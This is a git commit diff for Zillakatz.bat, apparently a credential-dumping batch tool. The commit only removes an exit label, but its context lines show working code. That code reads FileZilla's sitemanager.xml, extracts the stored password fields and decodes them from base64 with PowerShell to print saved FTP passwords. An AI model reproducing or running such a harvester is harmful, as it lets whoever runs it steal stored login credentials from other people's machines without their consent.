6d94f22ed7e41982841a7e5353478a18051f8123
anic17 <58483910+anic17@users.noreply.github.com>
2021-10-12 19:29:12 +0200

    Update Zillakatz.bat

--- Zillakatz.bat
+++ Zillakatz.bat
@@ -4,5 +4,3 @@ for /f "tokens=2 delims=>" %%A in ('findstr /ic:"<pass" "%z%\sitemanager.xml"') 
 set b=%~1
 set p=%b: =%
 <nul set /p =Password: &powershell "[Text.Encoding]::UTF8.GetString([convert]::FromBase64String('%p%'))"
-:e
-exit /B
